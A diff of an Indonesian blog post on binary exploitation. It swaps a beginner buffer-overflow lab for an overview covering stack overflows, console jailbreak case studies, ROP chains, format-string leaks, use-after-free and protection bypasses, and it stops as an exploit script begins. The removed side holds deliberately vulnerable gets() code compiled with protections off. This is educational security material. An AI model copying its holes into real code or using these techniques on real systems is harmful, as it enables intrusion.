@@ -41,21 +41,13 @@
   
   
     <meta name="description" content="
-🔥 Pendahuluan
-PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
-
-🛠 1. Persiapan Lab Environment
-
-A. Sistem Operasi dan Tools Dasar
-Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
-sudo apt update
-sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
-Penjelasan Tools:">
+Binary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).
+Selama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.">
   
 
   <title>
     
-      Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development
+      Tentang Binary Exploitation dan Buffer Overflow - pwn01
     
   </title>
 
@@ -73,45 +65,21 @@ Penjelasan Tools:">
 
   
     <meta name="description" content="
-🔥 Pendahuluan
-PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
-
-🛠 1. Persiapan Lab Environment
-
-A. Sistem Operasi dan Tools Dasar
-Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
-sudo apt update
-sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
-Penjelasan Tools:">
+Binary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).
+Selama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.">
     <meta property="og:description" content="
-🔥 Pendahuluan
-PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
-
-🛠 1. Persiapan Lab Environment
-
-A. Sistem Operasi dan Tools Dasar
-Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
-sudo apt update
-sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
-Penjelasan Tools:">
+Binary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).
+Selama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.">
     <meta property="og:image" content="/images/cuteheker.jpeg">
     <meta name="twitter:image" content="/images/cuteheker.jpeg">
 
   <meta property="og:type" content="article">
   <meta property="og:url" content="/posts/buffer-overflow/">
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development">
+  <meta name="twitter:title" content="Tentang Binary Exploitation dan Buffer Overflow - pwn01">
   <meta name="twitter:description" content="
-🔥 Pendahuluan
-PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari nol sampai bisa membuat proof-of-concept buffer overflow dengan penjelasan mendetail untuk pemula.
-
-🛠 1. Persiapan Lab Environment
-
-A. Sistem Operasi dan Tools Dasar
-Kita akan menggunakan Linux (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:
-sudo apt update
-sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
-Penjelasan Tools:">
+Binary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).
+Selama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.">
 </head>
 
 
@@ -135,7 +103,7 @@ Penjelasan Tools:">
     <p class="post-meta">
     </p>
 
-<h1>Belajar Buffer Overflow Biar Ngerti Dunia PWN - Exploit Development<br><br>
+<h1>Tentang Binary Exploitation dan Buffer Overflow - pwn01<br><br>
     <small datetime="2025-08-11 00:00:00 &#43;0000 UTC" style="font-size: 10px; display: inline-flex; align-items: center;">
         <img src="https://avatars.githubusercontent.com/u/51517043?v=4" alt="GitHub Profile" style="width: 30px; height: 30px; border-radius: 50%; object-fit: cover; margin-right: 8px;">
         2025-08-11 - Rainhynn
@@ -145,212 +113,307 @@ Penjelasan Tools:">
     
 
     <p><img src="https://i.ibb.co.com/hRyZnWQm/images-3.jpg" alt="PWN THUMB"></p>
-<h2 id="-pendahuluan">🔥 Pendahuluan</h2>
-<p>PWN adalah salah satu bidang dalam keamanan siber yang fokus pada eksploitasi binary. Tutorial ini akan memandu kalian dari <strong>nol</strong> sampai bisa membuat <strong>proof-of-concept buffer overflow</strong> dengan penjelasan mendetail untuk pemula.</p>
+<p>Binary exploitation merupakan salah satu keahlian paling krusial dalam dunia penetration testing dan keamanan siber. Teknik ini memungkinkan kita menemukan dan memanfaatkan kerentanan tingkat lanjut dalam program dan sistem operasi, yang seringkali menjadi pintu masuk untuk mendapatkan kendali penuh atas sistem target (remote code execution) atau meningkatkan hak akses secara lokal (privilege escalation).</p>
+<p>Selama bertahun-tahun, berbagai proteksi telah dikembangkan untuk memitigasi kerentanan memori, mulai dari tingkat kernel sistem operasi hingga teknik kompilasi binary. Namun, selalu ada celah untuk mengeksploitasi kesalahan-kesalahan kecil dalam penanganan memori pada binary.</p>
+<h3 id="kompetensi-yang-diperlukan"><strong>Kompetensi yang Diperlukan</strong></h3>
+<p>Untuk menguasai binary exploitation modern, diperlukan pemahaman mendalam tentang:</p>
+<ol>
+<li><strong>Bahasa Assembly</strong> (arsitektur x86/x64)</li>
+<li><strong>Arsitektur Komputer</strong> (register, stack, heap, memory management)</li>
+<li><strong>Fundamental Binary Exploitation</strong> (buffer overflow, ROP, format string)</li>
+</ol>
+<p>Bagi yang belum familiar dengan Assembly dan arsitektur komputer, sangat disarankan untuk mempelajari modul <strong>&ldquo;Intro to Assembly Language&rdquo;</strong> terlebih dahulu. Sedangkan untuk praktik dasar buffer overflow di Linux, modul <strong>&ldquo;Stack-Based Buffer Overflows on Linux x86&rdquo;</strong> menyediakan landasan yang baik.</p>
 <hr>
-<h2 id="-1-persiapan-lab-environment">🛠 1. Persiapan Lab Environment</h2>
+<h2 id="memahami-buffer-overflow-secara-mendalam"><strong>Memahami Buffer Overflow Secara Mendalam</strong></h2>
+<h3 id="konsep-dasar-buffer-overflow"><strong>Konsep Dasar Buffer Overflow</strong></h3>
 <p><img src="https://i.ibb.co.com/NgtWGDdw/images-2.jpg" alt="PWN Header"></p>
-<h3 id="a-sistem-operasi-dan-tools-dasar">A. Sistem Operasi dan Tools Dasar</h3>
-<p>Kita akan menggunakan <strong>Linux</strong> (Debian/Ubuntu) atau WSL di Windows. Berikut perintah instalasi tools dasar:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt update
-</span></span><span style="display:flex;"><span>sudo apt install -y build-essential python3 python3-pip gdb gdb-multiarch
-</span></span></code></pre></div><p><strong>Penjelasan Tools:</strong></p>
-<ul>
-<li><code>build-essential</code>: Untuk kompilasi program C (termasuk GCC)</li>
-<li><code>gdb</code>: Debugger untuk analisis binary</li>
-<li><code>gdb-multiarch</code>: Debugger yang support multi-architecture</li>
-</ul>
-<h3 id="b-install-pwntools">B. Install Pwntools</h3>
-<p>Pwntools adalah framework Python untuk eksploitasi binary:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip3 install pwntools
-</span></span></code></pre></div><p><strong>Fitur Penting Pwntools:</strong></p>
-<ul>
-<li>Membuat payload secara dinamis</li>
-<li>Berinteraksi dengan proses/program</li>
-<li>Analisis core dump</li>
-<li>Bekerja dengan berbagai architecture</li>
-</ul>
-<h3 id="c-matikan-proteksi-keamanan-untuk-pembelajaran">C. Matikan Proteksi Keamanan (Untuk Pembelajaran)</h3>
-<p>Di dunia nyata, binary memiliki berbagai proteksi. Untuk belajar, kita matikan dulu:</p>
-<ul>
-<li><strong>Stack Canary</strong>: Deteksi buffer overflow</li>
-<li><strong>PIE (Position Independent Executable)</strong>: Alamat memory yang random</li>
-<li><strong>NX (No-Execute)</strong>: Mencegah eksekusi code di stack</li>
-</ul>
-<hr>
-<h2 id="-2-membuat-program-vulnerable">📜 2. Membuat Program Vulnerable</h2>
-<p>Buat file <code>vuln.c</code> dengan kode berikut:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
-</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
-</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">10</span>]; <span style="color:#0f0">// Buffer hanya 10 byte
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Input: &#34;</span>);
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">gets</span>(buf); <span style="color:#0f0">// Fungsi berbahaya! Tidak ada batasan input
-</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;You entered: %s</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>, buf);
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
-</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
-</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h3 id="kompilasi-program">Kompilasi Program</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gcc vuln.c -o vuln -fno-stack-protector -no-pie -g
-</span></span></code></pre></div><p><strong>Flag Kompilasi:</strong></p>
-<ul>
-<li><code>-fno-stack-protector</code>: Matikan stack canary</li>
-<li><code>-no-pie</code>: Buat alamat fungsi tetap (tidak random)</li>
-<li><code>-g</code>: Tambahkan simbol debug untuk GDB</li>
-</ul>
-<hr>
-<h2 id="-3-analisis-binary-dengan-checksec">🔍 3. Analisis Binary dengan Checksec</h2>
-<p>Cek proteksi binary menggunakan <code>checksec</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checksec --file=./vuln
-</span></span></code></pre></div><p><strong>Output Contoh:</strong></p>
-<pre tabindex="0"><code>Arch:     amd64-64-little
-RELRO:    Partial RELRO
-Stack:    No canary found
-NX:       NX enabled
-PIE:      No PIE (0x400000)
-</code></pre><p><strong>Interpretasi:</strong></p>
-<ul>
-<li><strong>No canary</strong>: Bisa overflow stack tanpa deteksi</li>
-<li><strong>No PIE</strong>: Alamat fungsi predictable</li>
-<li><strong>NX enabled</strong>: Stack tidak bisa dieksekusi (butuh ROP nanti)</li>
-</ul>
-<hr>
-<h2 id="-4-debugging-dengan-gdb">🧠 4. Debugging dengan GDB</h2>
-<h3 id="langkah-dasar-gdb">Langkah Dasar GDB</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>gdb ./vuln
-</span></span></code></pre></div><p><strong>Perintah GDB Penting:</strong></p>
-<pre tabindex="0"><code class="language-gdb" data-lang="gdb">(gdb) break vuln       # Set breakpoint di fungsi vuln
-(gdb) run             # Jalankan program
-(gdb) info registers  # Lihat nilai register
-(gdb) x/20wx $rsp     # Lihat 20 word di stack pointer
-</code></pre><h3 id="eksperimen-crash">Eksperimen Crash</h3>
+<p>Buffer overflow terjadi ketika program menerima input data yang melebihi kapasitas buffer yang dialokasikan, menyebabkan data tersebut &ldquo;meluap&rdquo; (overflow) dan menimpa area memori sekitarnya. Fenomena ini terutama terjadi di stack memory, meskipun bisa juga terjadi di heap.</p>
+<h3 id="mekanisme-overflow-pada-stack"><strong>Mekanisme Overflow pada Stack</strong></h3>
+<p>Stack menggunakan prinsip <strong>LIFO (Last-In, First-Out)</strong>. Setiap kali fungsi dipanggil:</p>
 <ol>
-<li>Jalankan program di GDB</li>
-<li>Ketika diminta input, masukkan <code>AAAAAAAAAAAAAAAAAAAA</code> (20 karakter &lsquo;A&rsquo;)</li>
-<li>Program akan crash dengan error <code>Segmentation fault</code></li>
+<li><strong>Stack frame</strong> baru dibuat</li>
+<li><strong>Return address (EIP/RIP)</strong> disimpan di stack</li>
+<li><strong>Parameter fungsi</strong> dan <strong>variabel lokal</strong> ditempatkan di stack</li>
 </ol>
-<p><strong>Analisis:</strong></p>
-<ul>
-<li>Register <code>RIP</code> akan berisi <code>0x414141414141</code> (&lsquo;AAAA&rsquo; dalam hex)</li>
-<li>Artinya kita berhasil menimpa return address!</li>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#0f0">; Contoh assembly sederhana
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">push</span> <span style="color:#f60">0x41</span>       <span style="color:#0f0">; Simpan nilai 0x41 (&#39;A&#39;) di stack
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">push</span> <span style="color:#f60">0x42</span>       <span style="color:#0f0">; Simpan nilai 0x42 (&#39;B&#39;) di stack
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ff0">pop</span> <span style="color:#7fffd4">eax</span>         <span style="color:#0f0">; Ambil nilai teratas (0x42) ke register EAX
+</span></span></span></code></pre></div><h3 id="visualisasi-stack-normal-vs-stack-overflow"><strong>Visualisasi Stack Normal vs Stack Overflow</strong></h3>
+<p><strong>Stack Normal:</strong></p>
+<pre tabindex="0"><code>0x42    &lt;-- Top of Stack (ESP)
+0x41
+...
+</code></pre><p><strong>Stack Overflow (input 12 byte pada buffer 8 byte):</strong></p>
+<pre tabindex="0"><code>[Buffer (8 byte)] [EBP] [EIP]
+AAAAAAAA AAAA AAAA  &lt;-- EIP tertimpa!
+</code></pre><ul>
+<li>Nilai return address (EIP) tertimpa menjadi <code>0x41414141</code> (hex untuk &lsquo;AAAA&rsquo;)</li>
+<li>Program crash saat mencoba eksekusi di alamat invalid tersebut</li>
 </ul>
 <hr>
-<h2 id="-5-mencari-offset-dengan-pwntools">🧮 5. Mencari Offset dengan Pwntools</h2>
-<p>Kita perlu tahu <strong>berapa byte</strong> sampai mencapai return address. Gunakan script berikut:</p>
+<h2 id="klasifikasi-buffer-overflow"><strong>Klasifikasi Buffer Overflow</strong></h2>
+<h3 id="1-berdasarkan-lokasi-memory"><strong>1. Berdasarkan Lokasi Memory</strong></h3>
+<table>
+  <thead>
+      <tr>
+          <th>Jenis</th>
+          <th>Lokasi</th>
+          <th>Karakteristik</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td><strong>Stack Overflow</strong></td>
+          <td>Stack memory</td>
+          <td>Paling umum, relatif mudah dieksploitasi</td>
+      </tr>
+      <tr>
+          <td><strong>Heap Overflow</strong></td>
+          <td>Heap memory</td>
+          <td>Lebih kompleks, membutuhkan teknik khusus</td>
+      </tr>
+      <tr>
+          <td><strong>BSS Overflow</strong></td>
+          <td>.bss section</td>
+          <td>Jarang, tapi mungkin pada program tertentu</td>
+      </tr>
+  </tbody>
+</table>
+<h3 id="2-berdasarkan-teknik-exploitasi"><strong>2. Berdasarkan Teknik Exploitasi</strong></h3>
+<ol>
+<li><strong>Denial of Service (DoS)</strong>
+<ul>
+<li>Crash program dengan overflow sederhana</li>
+</ul>
+</li>
+<li><strong>Arbitrary Code Execution</strong>
+<ul>
+<li>Redirect execution flow ke shellcode</li>
+</ul>
+</li>
+<li><strong>Return-Oriented Programming (ROP)</strong>
+<ul>
+<li>Chain gadget untuk bypass proteksi memori</li>
+</ul>
+</li>
+<li><strong>Data Corruption</strong>
+<ul>
+<li>Ubah nilai variabel kritis di memori</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h2 id="studi-kasus-nyata--analisis-mendalam"><strong>Studi Kasus Nyata &amp; Analisis Mendalam</strong></h2>
+<h3 id="1-iphone-jailbreak-ios-4---greenpois0n"><strong>1. iPhone Jailbreak (iOS 4 - greenpois0n)</strong></h3>
+<ul>
+<li><strong>Vulnerability</strong>: Stack overflow pada HFS Volume Name</li>
+<li><strong>Exploit Technique</strong>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Pseudocode exploit
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">char</span> volume_name[<span style="color:#f60">256</span>];
+</span></span><span style="display:flex;"><span><span style="color:#ff0">strcpy</span>(volume_name, malicious_payload);  <span style="color:#0f0">// Overflow terjadi di sini
+</span></span></span></code></pre></div></li>
+<li><strong>Payload Structure</strong>:
+<pre tabindex="0"><code>[NOP sled][shellcode][return address]
+</code></pre></li>
+<li><strong>Patch</strong>: iOS 4.3 memperkenalkan ASLR dan stack protection</li>
+</ul>
+<h3 id="2-playstation-portable-psp---tiff-exploit"><strong>2. PlayStation Portable (PSP - TIFF Exploit)</strong></h3>
+<ul>
+<li><strong>Bug</strong>: Integer overflow pada TIFF parsing</li>
+<li><strong>Exploit Flow</strong>:
+<ol>
+<li>Buat file TIFF korup dengan dimensi gambar overflow</li>
+<li>Set background ke PNG korup</li>
+<li>Buka di Photo Viewer → EIP kontrol → shellcode execution</li>
+</ol>
+</li>
+<li><strong>Technical Details</strong>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Contoh struktur exploit</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">with</span> open(<span style="color:#87ceeb">&#39;exploit.tiff&#39;</span>, <span style="color:#87ceeb">&#39;wb&#39;</span>) <span style="color:#f00">as</span> f:
+</span></span><span style="display:flex;"><span>    f.write(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\x49\x49\x2a\x00</span><span style="color:#87ceeb">&#39;</span>)  <span style="color:#0f0"># Header TIFF</span>
+</span></span><span style="display:flex;"><span>    f.write(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\x08\x00\x00\x00</span><span style="color:#87ceeb">&#39;</span>)  <span style="color:#0f0"># Offset pertama</span>
+</span></span><span style="display:flex;"><span>    f.write(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\xff\xff\xff\x7f</span><span style="color:#87ceeb">&#39;</span>)  <span style="color:#0f0"># Width overflow</span>
+</span></span><span style="display:flex;"><span>    f.write(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;</span><span style="color:#87ceeb">\xff\xff\xff\x7f</span><span style="color:#87ceeb">&#39;</span>)  <span style="color:#0f0"># Height overflow</span>
+</span></span><span style="display:flex;"><span>    f.write(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span>*<span style="color:#f60">1000</span>)            <span style="color:#0f0"># Payload</span>
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="3-nintendo-wii-twilight-hack"><strong>3. Nintendo Wii (Twilight Hack)</strong></h3>
+<ul>
+<li><strong>Vulnerability</strong>: Stack overflow pada nama karakter</li>
+<li><strong>Exploitasi</strong>:
+<ul>
+<li>Ubah nama kuda &ldquo;Epona&rdquo; menjadi string panjang berisi payload</li>
+<li>Save game korup → load game → kontrol EIP</li>
+</ul>
+</li>
+<li><strong>Payload Design</strong>:
+<pre tabindex="0"><code>[Junk data][hacked save function address][shellcode]
+</code></pre></li>
+</ul>
+<hr>
+<h2 id="teknik-exploitasi-lanjutan"><strong>Teknik Exploitasi Lanjutan</strong></h2>
+<h3 id="1-return-oriented-programming-rop"><strong>1. Return-Oriented Programming (ROP)</strong></h3>
+<p><strong>Digunakan ketika:</strong></p>
+<ul>
+<li>NX (No-Execute) diaktifkan</li>
+<li>ASLR membuat alamat shellcode tidak pasti</li>
+</ul>
+<p><strong>Contoh ROP Chain:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rop_chain = [
+</span></span><span style="display:flex;"><span>    pop_rdi,       <span style="color:#0f0"># Gadget 1: pop rdi; ret</span>
+</span></span><span style="display:flex;"><span>    binsh_addr,    <span style="color:#0f0"># Alamat string &#34;/bin/sh&#34;</span>
+</span></span><span style="display:flex;"><span>    system_addr    <span style="color:#0f0"># Alamat fungsi system()</span>
+</span></span><span style="display:flex;"><span>]
+</span></span></code></pre></div><h3 id="2-bypass-aslr-dengan-memory-leak"><strong>2. Bypass ASLR dengan Memory Leak</strong></h3>
+<p><strong>Teknik:</strong></p>
+<ol>
+<li>Eksploitasi Format String bug untuk leak alamat libc</li>
+<li>Hitung base address libc</li>
+<li>Bangun ROP chain berdasarkan alamat aktual</li>
+</ol>
+<p><strong>Contoh Implementasi:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Leak alamat puts</span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%7$p&#39;</span>
+</span></span><span style="display:flex;"><span>send(payload)
+</span></span><span style="display:flex;"><span>leak = int(recv(), <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>libc_base = leak - libc.sym.puts
+</span></span><span style="display:flex;"><span>system_addr = libc_base + libc.sym.system
+</span></span></code></pre></div><h3 id="3-heap-exploitation-modern"><strong>3. Heap Exploitation Modern</strong></h3>
+<p><strong>Teknik Utama:</strong></p>
+<ul>
+<li><strong>Use-After-Free (UAF)</strong></li>
+<li><strong>Double Free</strong></li>
+<li><strong>Tcache Poisoning</strong></li>
+<li><strong>House of Spirit</strong></li>
+</ul>
+<p><strong>Contoh Use-After-Free:</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#0f0">// Vulnerable code
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#ee82ee">char</span> *ptr = <span style="color:#ff0">malloc</span>(<span style="color:#f60">32</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff0">free</span>(ptr);
+</span></span><span style="display:flex;"><span>*ptr = <span style="color:#87ceeb">&#39;A&#39;</span>;  <span style="color:#0f0">// UAF terjadi di sini
+</span></span></span></code></pre></div><hr>
+<h2 id="proteksi-modern--teknik-bypass"><strong>Proteksi Modern &amp; Teknik Bypass</strong></h2>
+<h3 id="1-nxxd-no-execute"><strong>1. NX/XD (No-Execute)</strong></h3>
+<ul>
+<li><strong>Cara Bypass</strong>: ROP, ret2libc</li>
+<li><strong>Contoh</strong>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>rop = flat([
+</span></span><span style="display:flex;"><span>    pop_rdi, binsh,
+</span></span><span style="display:flex;"><span>    ret,     <span style="color:#0f0"># Stack alignment</span>
+</span></span><span style="display:flex;"><span>    system
+</span></span><span style="display:flex;"><span>])
+</span></span></code></pre></div></li>
+</ul>
+<h3 id="2-aslr-address-space-layout-randomization"><strong>2. ASLR (Address Space Layout Randomization)</strong></h3>
+<ul>
+<li><strong>Bypass Method</strong>:
+<ul>
+<li>Memory leak</li>
+<li>Bruteforce (pada sistem 32-bit)</li>
+<li>Partial overwrite</li>
+</ul>
+</li>
+</ul>
+<h3 id="3-stack-canaries"><strong>3. Stack Canaries</strong></h3>
+<ul>
+<li><strong>Cara Bypass</strong>:
+<ul>
+<li>Leak canary melalui Format String</li>
+<li>Null byte overwrite (pada kasus tertentu)</li>
+<li>Bruteforce (jarang feasible)</li>
+</ul>
+</li>
+</ul>
+<h3 id="4-relro-relocation-read-only"><strong>4. RELRO (Relocation Read-Only)</strong></h3>
+<ul>
+<li><strong>Implikasi</strong>:
+<ul>
+<li>Full RELRO: GOT overwrite tidak mungkin</li>
+<li>Partial RELRO: Masih mungkin GOT overwrite</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h2 id="panduan-praktis-exploit-development"><strong>Panduan Praktis Exploit Development</strong></h2>
+<h3 id="langkah-langkah-eksploitasi-buffer-overflow"><strong>Langkah-langkah Eksploitasi Buffer Overflow</strong></h3>
+<ol>
+<li><strong>Fuzzing</strong> - Identifikasi titik overflow</li>
+<li><strong>Offset Determination</strong> - Cari jarak ke EIP/RIP
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pattern create <span style="color:#f60">200</span>
+</span></span><span style="display:flex;"><span>pattern offset <span style="color:#eedd82">$eip</span>
+</span></span></code></pre></div></li>
+<li><strong>Control EIP</strong> - Verifikasi kontrol alamat return</li>
+<li><strong>Bad Character Analysis</strong> - Identifikasi byte terlarang</li>
+<li><strong>Shellcode Development</strong> - Buat payload efektif</li>
+<li><strong>Exploit Finalization</strong> - Gabungkan semua komponen</li>
+</ol>
+<h3 id="contoh-script-exploit-lengkap"><strong>Contoh Script Exploit Lengkap</strong></h3>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#34;./vuln&#34;</span>)
-</span></span><span style="display:flex;"><span>payload = cyclic(<span style="color:#f60">50</span>)  <span style="color:#0f0"># Generate pattern unik</span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>p.wait()
+</span></span><span style="display:flex;"><span>context.arch = <span style="color:#87ceeb">&#39;i386&#39;</span>
+</span></span><span style="display:flex;"><span>elf = ELF(<span style="color:#87ceeb">&#39;./vulnerable&#39;</span>)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>core = p.corefile
-</span></span><span style="display:flex;"><span>rip_value = core.rip
-</span></span><span style="display:flex;"><span>offset = cyclic_find(rip_value)
-</span></span><span style="display:flex;"><span>print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Offset ke return address: </span><span style="color:#87ceeb">{</span>offset<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
-</span></span></code></pre></div><p><strong>Contoh Output:</strong></p>
